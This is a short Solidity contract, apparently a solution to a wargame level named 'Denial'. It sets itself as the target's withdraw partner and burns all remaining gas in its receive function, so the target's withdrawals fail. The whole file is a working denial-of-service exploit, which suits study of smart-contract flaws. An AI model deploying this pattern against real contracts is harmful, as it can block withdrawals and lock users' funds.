// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract DenialAttacker {
    Denial denial;

    constructor(address payable _denial) payable {
        denial = Denial(_denial);
    }

    function attack() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        // consume 1M gas
        while (gasleft() > 0) {
            denial.contractBalance();
        }
    }
}
